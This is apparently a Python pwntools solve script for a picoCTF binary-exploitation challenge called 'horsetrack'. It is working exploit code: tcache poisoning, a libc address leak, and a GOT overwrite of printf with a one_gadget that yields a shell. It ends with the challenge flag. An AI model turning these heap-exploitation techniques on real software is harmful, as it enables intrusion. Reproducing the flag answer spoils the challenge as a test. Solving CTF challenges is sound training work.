from pwn import *
#context.log_level = 'debug'
e = ELF('./horsetrack')
libc = ELF('./libc.so.6')
isRemote = True
HOST = 'saturn.picoctf.net'
#PORT = 49357
PORT = 56177
#isRemote = False
if isRemote:
    r = remote(HOST, PORT) 
    # pwntools bug 
    # https://github.com/Gallopsled/pwntools/pull/563
    # fix: https://discord.com/channels/809590285687980052/809590285687980056/1089980004022095952 (in the pwntools discord server)
    r.newline = b'\r\n'
else:
    r = process('./horsetrack')
    #r = gdb.debug('./horsetrack', 'b *0x00401c0c\nc')

def add_horse(i, length, data):
    r.recvuntil(b'Choice: ')
    r.sendline(b'1')
    r.sendline(str(i).encode())
    r.recvuntil(b'?')
    r.sendline(str(length).encode())
    r.sendline(data)
def remove_horse(i):
    r.recvuntil(b'Choice: ')
    r.sendline(b'2')
    r.recvuntil(b'?')
    r.sendline(str(i).encode())
def race():
    r.recvuntil(b'Choice: ')
    r.sendline(b'3')
    if isRemote: 
        for _ in range(2): r.recvline() # socat does echoback
def do_exit():
    r.recvuntil(b'Choice: ')
    r.sendline(b'4')
def cheat(i, spot, data):
    r.recvuntil(b'Choice: ')
    r.sendline(b'0')
    r.recvuntil(b'?')
    r.sendline(str(i).encode())
    r.sendline(data)
    r.recvuntil(b'?')
    r.sendline(str(spot).encode())
add_horse(0, 16, b'a'*16)
remove_horse(0)
add_horse(0, 16, b'\xff')
for _ in range(4):
    add_horse(_ + 1, 16, b'a'*16)
print('racing')
race()

c = b'\x20'
while c[0] == 0x20:
    c = r.recv(1)
key = u16(c+r.recv(1))
print('aslr leak:', hex(key))
remove_horse(0) # move horse 0 to stall 17
add_horse(17, 16, b'\xff') # to clear the tcache bins

# has_cheated = false
add_horse(5, 16, b'\xff')
add_horse(6, 16, b'\xff')
remove_horse(5)
remove_horse(6)
cheat(6, 0, p64(e.sym['stdout']^key)+b'\xff')
add_horse(7, 16, b'\xff')
add_horse(8, 16, b'\xff')

add_horse(5, 16, b'\xff')
add_horse(6, 16, b'\xff')
remove_horse(5)
remove_horse(6)
cheat(6, 0, p64(0x004040e0^key)+b'\xff')
add_horse(9, 16, b'\xff')
add_horse(10, 16, b'\x00'*16)
print('libc leak')
race()
for _ in range(8): r.recvline()
c = b'\x20'
while c[0] == 0x20:
    c = r.recv(1)
libc_leak = u64(c+r.recv(5)+b'\x00\x00')
libc.address = libc_leak - libc.sym['_IO_2_1_stdout_']
print('stdout =', hex(libc_leak))
print('libc.address =', hex(libc.address))
add_horse(5, 16, b'\xff')
add_horse(6, 16, b'\xff')
remove_horse(5)
remove_horse(6)
cheat(6, 0, p64(e.got['printf']^key)+b'\xff')
payload = b'' 
one_gadget = p64(libc.address + 0xcad20)
i = 0 
while i < len(one_gadget) and one_gadget[i] != 0x7f:
    payload += bytes([one_gadget[i]])
    i += 1
payload += b'\xff'
print('got payload', payload)
assert b'\x7f' not in payload
add_horse(11, 16, b'\xff')
add_horse(0, 16, payload+b'\xff') 
# printf("Added horse to stable index %d", 0, 0);
# rsi = 0, rdx = 0 by checking the disassembly 

r.interactive()

# not quite sure why this happens:
#  : 1: \xff: not found
# i'm guessing it's an artifact from the one-gadget 

# flag: picoCTF{t_cache_4ll_th3_w4y_2_th4_b4nk_6112bbec}



